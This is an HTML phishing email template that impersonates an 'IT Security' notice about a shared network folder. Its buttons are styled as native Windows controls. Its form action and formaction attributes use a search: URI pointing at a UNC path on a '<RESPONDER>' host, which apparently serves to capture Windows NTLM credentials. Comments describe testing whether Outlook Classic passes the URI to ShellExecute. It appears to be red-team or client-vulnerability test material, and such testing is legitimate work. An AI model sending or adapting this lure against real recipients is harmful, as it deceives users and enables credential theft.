# SENDER: noreply@survey-monkeys.com
# SENDER_NAME: IT Security
# SUBJECT: search: URI | form action= submit button (not a link)

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f4f4f4; margin:0; padding:20px; }
        .container { max-width:600px; margin:0 auto; background:#fff; border:1px solid #e0e0e0; border-radius:8px; overflow:hidden; }
        .header { background:#0078d4; padding:20px 30px; color:#fff; }
        .header h2 { margin:0; font-size:18px; }
        .body { padding:30px; color:#333; line-height:1.6; }
        .footer { background:#f5f5f5; padding:15px 30px; font-size:11px; color:#888; border-top:1px solid #e0e0e0; }
        /* Styled to look like a native Windows button, not a hyperlink */
        .win-btn {
            background: #0078d4;
            color: #fff;
            border: none;
            padding: 10px 28px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 14px;
            border-radius: 3px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h2>Shared Resource Access</h2></div>
        <div class="body">
            <p>Hello,</p>
            <p>A network folder has been shared with you. Click the button below to open it in Windows Explorer.</p>
            <p style="text-align:center; margin:28px 0;">
                <!--
                  form action= with search: URI - if Outlook Classic processes forms,
                  clicking Submit calls ShellExecute with the action URI (no hyperlink involved).
                  Also testing button formaction= HTML5 attribute as fallback.
                -->
                <form action="search:query=formaction&amp;crumb=location:\\<RESPONDER>\testshare" method="get">
                    <button type="submit" class="win-btn">Open Shared Folder</button>
                </form>
            </p>
            <!-- HTML5 button formaction= variant (no parent form needed) -->
            <p style="text-align:center; margin:28px 0;">
                <form>
                    <button type="submit"
                            formaction="search:query=formaction2&amp;crumb=location:\\<RESPONDER>\testshare"
                            formmethod="get"
                            class="win-btn">Open (formaction variant)</button>
                </form>
            </p>
            <p>If you did not request this, contact IT support.</p>
            <p>IT Security Team</p>
        </div>
        <div class="footer">Automated notification — do not reply.</div>
    </div>
</body>
</html>
